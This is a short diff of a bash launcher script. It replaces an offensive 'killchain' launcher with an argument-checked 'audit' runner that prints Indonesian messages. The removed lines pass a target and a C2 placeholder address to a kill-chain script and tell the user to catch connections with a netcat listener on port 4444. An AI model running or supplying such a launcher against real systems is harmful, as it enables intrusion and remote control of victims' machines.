@@ -1,7 +1,20 @@
-#!/bin/bash
-TARGET=${1:?}
-C2="YOUR_IP_HERE"
+#!/usr/bin/env bash
+set -euo pipefail
 
-chmod +x *.sh *.py
-./killchain.sh $TARGET $C2
-echo "[+] Full killchain deployed. Monitor: nc -lvnp 4444"
+TARGET=${1:-}
+MODE=${2:-audit}
+
+if [[ -z "$TARGET" ]]; then
+  echo "Usage: $0 <target> [mode]"
+  echo "mode: audit (default)"
+  exit 2
+fi
+
+if [[ "$MODE" != "audit" ]]; then
+  echo "[!] Mode '$MODE' tidak didukung. Gunakan mode 'audit'."
+  exit 2
+fi
+
+chmod +x ./*.sh
+python3 runner.py "$TARGET" --mode "$MODE"
+echo "[+] Audit pipeline selesai untuk target: $TARGET"
